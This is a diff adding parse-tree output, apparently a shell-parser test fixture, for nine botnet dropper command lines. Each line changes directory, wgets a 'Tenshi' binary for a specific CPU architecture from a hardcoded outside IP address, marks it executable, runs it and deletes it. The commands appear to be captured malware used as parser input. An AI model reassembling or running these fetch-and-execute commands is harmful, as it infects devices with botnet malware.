@@ -1,0 +1,432 @@
+ListNode(lineno=2, pos=(12, 169), parts=[
+  CommandNode(lineno=2, pos=(12, 19), parts=[
+    WordNode(lineno=2, pos=(12, 14), word='cd'),
+    WordNode(lineno=2, pos=(15, 19), word='/tmp'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(20, 22)),
+  CommandNode(lineno=2, pos=(23, 34), parts=[
+    WordNode(lineno=2, pos=(23, 25), word='cd'),
+    WordNode(lineno=2, pos=(26, 34), word='/var/run'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(35, 37)),
+  CommandNode(lineno=2, pos=(38, 45), parts=[
+    WordNode(lineno=2, pos=(38, 40), word='cd'),
+    WordNode(lineno=2, pos=(41, 45), word='/mnt'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(46, 48)),
+  CommandNode(lineno=2, pos=(49, 57), parts=[
+    WordNode(lineno=2, pos=(49, 51), word='cd'),
+    WordNode(lineno=2, pos=(52, 57), word='/root'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(58, 60)),
+  CommandNode(lineno=2, pos=(61, 65), parts=[
+    WordNode(lineno=2, pos=(61, 63), word='cd'),
+    WordNode(lineno=2, pos=(64, 65), word='/'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(65, 66)),
+  CommandNode(lineno=2, pos=(67, 107), parts=[
+    WordNode(lineno=2, pos=(67, 71), word='wget'),
+    WordNode(lineno=2, pos=(72, 107), word='http://217.23.4.22/bins/Tenshi.mips'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(107, 108)),
+  CommandNode(lineno=2, pos=(109, 129), parts=[
+    WordNode(lineno=2, pos=(109, 114), word='chmod'),
+    WordNode(lineno=2, pos=(115, 117), word='+x'),
+    WordNode(lineno=2, pos=(118, 129), word='Tenshi.mips'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(129, 130)),
+  CommandNode(lineno=2, pos=(131, 149), parts=[
+    WordNode(lineno=2, pos=(131, 144), word='./Tenshi.mips'),
+    WordNode(lineno=2, pos=(145, 149), word='loic'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(149, 150)),
+  CommandNode(lineno=2, pos=(151, 169), parts=[
+    WordNode(lineno=2, pos=(151, 153), word='rm'),
+    WordNode(lineno=2, pos=(154, 157), word='-rf'),
+    WordNode(lineno=2, pos=(158, 169), word='Tenshi.mips'),
+  ]),
+])
+ListNode(lineno=3, pos=(170, 327), parts=[
+  CommandNode(lineno=3, pos=(170, 177), parts=[
+    WordNode(lineno=3, pos=(170, 172), word='cd'),
+    WordNode(lineno=3, pos=(173, 177), word='/tmp'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(178, 180)),
+  CommandNode(lineno=3, pos=(181, 192), parts=[
+    WordNode(lineno=3, pos=(181, 183), word='cd'),
+    WordNode(lineno=3, pos=(184, 192), word='/var/run'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(193, 195)),
+  CommandNode(lineno=3, pos=(196, 203), parts=[
+    WordNode(lineno=3, pos=(196, 198), word='cd'),
+    WordNode(lineno=3, pos=(199, 203), word='/mnt'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(204, 206)),
+  CommandNode(lineno=3, pos=(207, 215), parts=[
+    WordNode(lineno=3, pos=(207, 209), word='cd'),
+    WordNode(lineno=3, pos=(210, 215), word='/root'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(216, 218)),
+  CommandNode(lineno=3, pos=(219, 223), parts=[
+    WordNode(lineno=3, pos=(219, 221), word='cd'),
+    WordNode(lineno=3, pos=(222, 223), word='/'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(223, 224)),
+  CommandNode(lineno=3, pos=(225, 265), parts=[
+    WordNode(lineno=3, pos=(225, 229), word='wget'),
+    WordNode(lineno=3, pos=(230, 265), word='http://217.23.4.22/bins/Tenshi.mpsl'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(265, 266)),
+  CommandNode(lineno=3, pos=(267, 287), parts=[
+    WordNode(lineno=3, pos=(267, 272), word='chmod'),
+    WordNode(lineno=3, pos=(273, 275), word='+x'),
+    WordNode(lineno=3, pos=(276, 287), word='Tenshi.mpsl'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(287, 288)),
+  CommandNode(lineno=3, pos=(289, 307), parts=[
+    WordNode(lineno=3, pos=(289, 302), word='./Tenshi.mpsl'),
+    WordNode(lineno=3, pos=(303, 307), word='loic'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(307, 308)),
+  CommandNode(lineno=3, pos=(309, 327), parts=[
+    WordNode(lineno=3, pos=(309, 311), word='rm'),
+    WordNode(lineno=3, pos=(312, 315), word='-rf'),
+    WordNode(lineno=3, pos=(316, 327), word='Tenshi.mpsl'),
+  ]),
+])
+ListNode(lineno=4, pos=(328, 481), parts=[
+  CommandNode(lineno=4, pos=(328, 335), parts=[
+    WordNode(lineno=4, pos=(328, 330), word='cd'),
+    WordNode(lineno=4, pos=(331, 335), word='/tmp'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(336, 338)),
+  CommandNode(lineno=4, pos=(339, 350), parts=[
+    WordNode(lineno=4, pos=(339, 341), word='cd'),
+    WordNode(lineno=4, pos=(342, 350), word='/var/run'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(351, 353)),
+  CommandNode(lineno=4, pos=(354, 361), parts=[
+    WordNode(lineno=4, pos=(354, 356), word='cd'),
+    WordNode(lineno=4, pos=(357, 361), word='/mnt'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(362, 364)),
+  CommandNode(lineno=4, pos=(365, 373), parts=[
+    WordNode(lineno=4, pos=(365, 367), word='cd'),
+    WordNode(lineno=4, pos=(368, 373), word='/root'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(374, 376)),
+  CommandNode(lineno=4, pos=(377, 381), parts=[
+    WordNode(lineno=4, pos=(377, 379), word='cd'),
+    WordNode(lineno=4, pos=(380, 381), word='/'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(381, 382)),
+  CommandNode(lineno=4, pos=(383, 422), parts=[
+    WordNode(lineno=4, pos=(383, 387), word='wget'),
+    WordNode(lineno=4, pos=(388, 422), word='http://217.23.4.22/bins/Tenshi.arm'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(422, 423)),
+  CommandNode(lineno=4, pos=(424, 443), parts=[
+    WordNode(lineno=4, pos=(424, 429), word='chmod'),
+    WordNode(lineno=4, pos=(430, 432), word='+x'),
+    WordNode(lineno=4, pos=(433, 443), word='Tenshi.arm'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(443, 444)),
+  CommandNode(lineno=4, pos=(445, 462), parts=[
+    WordNode(lineno=4, pos=(445, 457), word='./Tenshi.arm'),
+    WordNode(lineno=4, pos=(458, 462), word='loic'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(462, 463)),
+  CommandNode(lineno=4, pos=(464, 481), parts=[
+    WordNode(lineno=4, pos=(464, 466), word='rm'),
+    WordNode(lineno=4, pos=(467, 470), word='-rf'),
+    WordNode(lineno=4, pos=(471, 481), word='Tenshi.arm'),
+  ]),
+])
+ListNode(lineno=5, pos=(482, 635), parts=[
+  CommandNode(lineno=5, pos=(482, 489), parts=[
+    WordNode(lineno=5, pos=(482, 484), word='cd'),
+    WordNode(lineno=5, pos=(485, 489), word='/tmp'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(490, 492)),
+  CommandNode(lineno=5, pos=(493, 504), parts=[
+    WordNode(lineno=5, pos=(493, 495), word='cd'),
+    WordNode(lineno=5, pos=(496, 504), word='/var/run'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(505, 507)),
+  CommandNode(lineno=5, pos=(508, 515), parts=[
+    WordNode(lineno=5, pos=(508, 510), word='cd'),
+    WordNode(lineno=5, pos=(511, 515), word='/mnt'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(516, 518)),
+  CommandNode(lineno=5, pos=(519, 527), parts=[
+    WordNode(lineno=5, pos=(519, 521), word='cd'),
+    WordNode(lineno=5, pos=(522, 527), word='/root'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(528, 530)),
+  CommandNode(lineno=5, pos=(531, 535), parts=[
+    WordNode(lineno=5, pos=(531, 533), word='cd'),
+    WordNode(lineno=5, pos=(534, 535), word='/'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(535, 536)),
+  CommandNode(lineno=5, pos=(537, 576), parts=[
+    WordNode(lineno=5, pos=(537, 541), word='wget'),
+    WordNode(lineno=5, pos=(542, 576), word='http://217.23.4.22/bins/Tenshi.ppc'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(576, 577)),
+  CommandNode(lineno=5, pos=(578, 597), parts=[
+    WordNode(lineno=5, pos=(578, 583), word='chmod'),
+    WordNode(lineno=5, pos=(584, 586), word='+x'),
+    WordNode(lineno=5, pos=(587, 597), word='Tenshi.ppc'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(597, 598)),
+  CommandNode(lineno=5, pos=(599, 616), parts=[
+    WordNode(lineno=5, pos=(599, 611), word='./Tenshi.ppc'),
+    WordNode(lineno=5, pos=(612, 616), word='loic'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(616, 617)),
+  CommandNode(lineno=5, pos=(618, 635), parts=[
+    WordNode(lineno=5, pos=(618, 620), word='rm'),
+    WordNode(lineno=5, pos=(621, 624), word='-rf'),
+    WordNode(lineno=5, pos=(625, 635), word='Tenshi.ppc'),
+  ]),
+])
+ListNode(lineno=6, pos=(636, 791), parts=[
+  CommandNode(lineno=6, pos=(636, 643), parts=[
+    WordNode(lineno=6, pos=(636, 638), word='cd'),
+    WordNode(lineno=6, pos=(639, 643), word='/tmp'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(644, 646)),
+  CommandNode(lineno=6, pos=(647, 658), parts=[
+    WordNode(lineno=6, pos=(647, 649), word='cd'),
+    WordNode(lineno=6, pos=(650, 658), word='/var/run'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(659, 661)),
+  CommandNode(lineno=6, pos=(662, 669), parts=[
+    WordNode(lineno=6, pos=(662, 664), word='cd'),
+    WordNode(lineno=6, pos=(665, 669), word='/mnt'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(670, 672)),
+  CommandNode(lineno=6, pos=(673, 681), parts=[
+    WordNode(lineno=6, pos=(673, 675), word='cd'),
+    WordNode(lineno=6, pos=(676, 681), word='/root'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(682, 684)),
+  CommandNode(lineno=6, pos=(685, 689), parts=[
+    WordNode(lineno=6, pos=(685, 687), word='cd'),
+    WordNode(lineno=6, pos=(688, 689), word='/'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(689, 690)),
+  CommandNode(lineno=6, pos=(691, 730), parts=[
+    WordNode(lineno=6, pos=(691, 695), word='wget'),
+    WordNode(lineno=6, pos=(696, 730), word='http://217.23.4.22/bins/Tenshi.x86'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(730, 731)),
+  CommandNode(lineno=6, pos=(732, 751), parts=[
+    WordNode(lineno=6, pos=(732, 737), word='chmod'),
+    WordNode(lineno=6, pos=(738, 740), word='+x'),
+    WordNode(lineno=6, pos=(741, 751), word='Tenshi.x86'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(751, 752)),
+  CommandNode(lineno=6, pos=(753, 772), parts=[
+    WordNode(lineno=6, pos=(753, 765), word='./Tenshi.x86'),
+    WordNode(lineno=6, pos=(766, 772), word='x86_64'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(772, 773)),
+  CommandNode(lineno=6, pos=(774, 791), parts=[
+    WordNode(lineno=6, pos=(774, 776), word='rm'),
+    WordNode(lineno=6, pos=(777, 780), word='-rf'),
+    WordNode(lineno=6, pos=(781, 791), word='Tenshi.x86'),
+  ]),
+])
+ListNode(lineno=7, pos=(792, 945), parts=[
+  CommandNode(lineno=7, pos=(792, 799), parts=[
+    WordNode(lineno=7, pos=(792, 794), word='cd'),
+    WordNode(lineno=7, pos=(795, 799), word='/tmp'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(800, 802)),
+  CommandNode(lineno=7, pos=(803, 814), parts=[
+    WordNode(lineno=7, pos=(803, 805), word='cd'),
+    WordNode(lineno=7, pos=(806, 814), word='/var/run'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(815, 817)),
+  CommandNode(lineno=7, pos=(818, 825), parts=[
+    WordNode(lineno=7, pos=(818, 820), word='cd'),
+    WordNode(lineno=7, pos=(821, 825), word='/mnt'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(826, 828)),
+  CommandNode(lineno=7, pos=(829, 837), parts=[
+    WordNode(lineno=7, pos=(829, 831), word='cd'),
+    WordNode(lineno=7, pos=(832, 837), word='/root'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(838, 840)),
+  CommandNode(lineno=7, pos=(841, 845), parts=[
+    WordNode(lineno=7, pos=(841, 843), word='cd'),
+    WordNode(lineno=7, pos=(844, 845), word='/'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(845, 846)),
+  CommandNode(lineno=7, pos=(847, 886), parts=[
+    WordNode(lineno=7, pos=(847, 851), word='wget'),
+    WordNode(lineno=7, pos=(852, 886), word='http://217.23.4.22/bins/Tenshi.sh4'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(886, 887)),
+  CommandNode(lineno=7, pos=(888, 907), parts=[
+    WordNode(lineno=7, pos=(888, 893), word='chmod'),
+    WordNode(lineno=7, pos=(894, 896), word='+x'),
+    WordNode(lineno=7, pos=(897, 907), word='Tenshi.sh4'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(907, 908)),
+  CommandNode(lineno=7, pos=(909, 926), parts=[
+    WordNode(lineno=7, pos=(909, 921), word='./Tenshi.sh4'),
+    WordNode(lineno=7, pos=(922, 926), word='loic'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(926, 927)),
+  CommandNode(lineno=7, pos=(928, 945), parts=[
+    WordNode(lineno=7, pos=(928, 930), word='rm'),
+    WordNode(lineno=7, pos=(931, 934), word='-rf'),
+    WordNode(lineno=7, pos=(935, 945), word='Tenshi.sh4'),
+  ]),
+])
+ListNode(lineno=8, pos=(946, 1103), parts=[
+  CommandNode(lineno=8, pos=(946, 953), parts=[
+    WordNode(lineno=8, pos=(946, 948), word='cd'),
+    WordNode(lineno=8, pos=(949, 953), word='/tmp'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(954, 956)),
+  CommandNode(lineno=8, pos=(957, 968), parts=[
+    WordNode(lineno=8, pos=(957, 959), word='cd'),
+    WordNode(lineno=8, pos=(960, 968), word='/var/run'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(969, 971)),
+  CommandNode(lineno=8, pos=(972, 979), parts=[
+    WordNode(lineno=8, pos=(972, 974), word='cd'),
+    WordNode(lineno=8, pos=(975, 979), word='/mnt'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(980, 982)),
+  CommandNode(lineno=8, pos=(983, 991), parts=[
+    WordNode(lineno=8, pos=(983, 985), word='cd'),
+    WordNode(lineno=8, pos=(986, 991), word='/root'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(992, 994)),
+  CommandNode(lineno=8, pos=(995, 999), parts=[
+    WordNode(lineno=8, pos=(995, 997), word='cd'),
+    WordNode(lineno=8, pos=(998, 999), word='/'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(999, 1000)),
+  CommandNode(lineno=8, pos=(1001, 1041), parts=[
+    WordNode(lineno=8, pos=(1001, 1005), word='wget'),
+    WordNode(lineno=8, pos=(1006, 1041), word='http://217.23.4.22/bins/Tenshi.arm4'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1041, 1042)),
+  CommandNode(lineno=8, pos=(1043, 1063), parts=[
+    WordNode(lineno=8, pos=(1043, 1048), word='chmod'),
+    WordNode(lineno=8, pos=(1049, 1051), word='+x'),
+    WordNode(lineno=8, pos=(1052, 1063), word='Tenshi.arm4'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1063, 1064)),
+  CommandNode(lineno=8, pos=(1065, 1083), parts=[
+    WordNode(lineno=8, pos=(1065, 1078), word='./Tenshi.arm4'),
+    WordNode(lineno=8, pos=(1079, 1083), word='loic'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1083, 1084)),
+  CommandNode(lineno=8, pos=(1085, 1103), parts=[
+    WordNode(lineno=8, pos=(1085, 1087), word='rm'),
+    WordNode(lineno=8, pos=(1088, 1091), word='-rf'),
+    WordNode(lineno=8, pos=(1092, 1103), word='Tenshi.arm4'),
+  ]),
+])
+ListNode(lineno=9, pos=(1104, 1261), parts=[
+  CommandNode(lineno=9, pos=(1104, 1111), parts=[
+    WordNode(lineno=9, pos=(1104, 1106), word='cd'),
+    WordNode(lineno=9, pos=(1107, 1111), word='/tmp'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1112, 1114)),
+  CommandNode(lineno=9, pos=(1115, 1126), parts=[
+    WordNode(lineno=9, pos=(1115, 1117), word='cd'),
+    WordNode(lineno=9, pos=(1118, 1126), word='/var/run'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1127, 1129)),
+  CommandNode(lineno=9, pos=(1130, 1137), parts=[
+    WordNode(lineno=9, pos=(1130, 1132), word='cd'),
+    WordNode(lineno=9, pos=(1133, 1137), word='/mnt'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1138, 1140)),
+  CommandNode(lineno=9, pos=(1141, 1149), parts=[
+    WordNode(lineno=9, pos=(1141, 1143), word='cd'),
+    WordNode(lineno=9, pos=(1144, 1149), word='/root'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1150, 1152)),
+  CommandNode(lineno=9, pos=(1153, 1157), parts=[
+    WordNode(lineno=9, pos=(1153, 1155), word='cd'),
+    WordNode(lineno=9, pos=(1156, 1157), word='/'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1157, 1158)),
+  CommandNode(lineno=9, pos=(1159, 1199), parts=[
+    WordNode(lineno=9, pos=(1159, 1163), word='wget'),
+    WordNode(lineno=9, pos=(1164, 1199), word='http://217.23.4.22/bins/Tenshi.arm5'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1199, 1200)),
+  CommandNode(lineno=9, pos=(1201, 1221), parts=[
+    WordNode(lineno=9, pos=(1201, 1206), word='chmod'),
+    WordNode(lineno=9, pos=(1207, 1209), word='+x'),
+    WordNode(lineno=9, pos=(1210, 1221), word='Tenshi.arm5'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1221, 1222)),
+  CommandNode(lineno=9, pos=(1223, 1241), parts=[
+    WordNode(lineno=9, pos=(1223, 1236), word='./Tenshi.arm5'),
+    WordNode(lineno=9, pos=(1237, 1241), word='loic'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1241, 1242)),
+  CommandNode(lineno=9, pos=(1243, 1261), parts=[
+    WordNode(lineno=9, pos=(1243, 1245), word='rm'),
+    WordNode(lineno=9, pos=(1246, 1249), word='-rf'),
+    WordNode(lineno=9, pos=(1250, 1261), word='Tenshi.arm5'),
+  ]),
+])
+ListNode(lineno=10, pos=(1262, 1419), parts=[
+  CommandNode(lineno=10, pos=(1262, 1269), parts=[
+    WordNode(lineno=10, pos=(1262, 1264), word='cd'),
+    WordNode(lineno=10, pos=(1265, 1269), word='/tmp'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1270, 1272)),
+  CommandNode(lineno=10, pos=(1273, 1284), parts=[
+    WordNode(lineno=10, pos=(1273, 1275), word='cd'),
+    WordNode(lineno=10, pos=(1276, 1284), word='/var/run'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1285, 1287)),
+  CommandNode(lineno=10, pos=(1288, 1295), parts=[
+    WordNode(lineno=10, pos=(1288, 1290), word='cd'),
+    WordNode(lineno=10, pos=(1291, 1295), word='/mnt'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1296, 1298)),
+  CommandNode(lineno=10, pos=(1299, 1307), parts=[
+    WordNode(lineno=10, pos=(1299, 1301), word='cd'),
+    WordNode(lineno=10, pos=(1302, 1307), word='/root'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1308, 1310)),
+  CommandNode(lineno=10, pos=(1311, 1315), parts=[
+    WordNode(lineno=10, pos=(1311, 1313), word='cd'),
+    WordNode(lineno=10, pos=(1314, 1315), word='/'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1315, 1316)),
+  CommandNode(lineno=10, pos=(1317, 1357), parts=[
+    WordNode(lineno=10, pos=(1317, 1321), word='wget'),
+    WordNode(lineno=10, pos=(1322, 1357), word='http://217.23.4.22/bins/Tenshi.arm6'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1357, 1358)),
+  CommandNode(lineno=10, pos=(1359, 1379), parts=[
+    WordNode(lineno=10, pos=(1359, 1364), word='chmod'),
+    WordNode(lineno=10, pos=(1365, 1367), word='+x'),
+    WordNode(lineno=10, pos=(1368, 1379), word='Tenshi.arm6'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1379, 1380)),
+  CommandNode(lineno=10, pos=(1381, 1399), parts=[
+    WordNode(lineno=10, pos=(1381, 1394), word='./Tenshi.arm6'),
+    WordNode(lineno=10, pos=(1395, 1399), word='loic'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1399, 1400)),
+  CommandNode(lineno=10, pos=(1401, 1419), parts=[
+    WordNode(lineno=10, pos=(1401, 1403), word='rm'),
+    WordNode(lineno=10, pos=(1404, 1407), word='-rf'),
+    WordNode(lineno=10, pos=(1408, 1419), word='Tenshi.arm6'),
+  ]),
+])
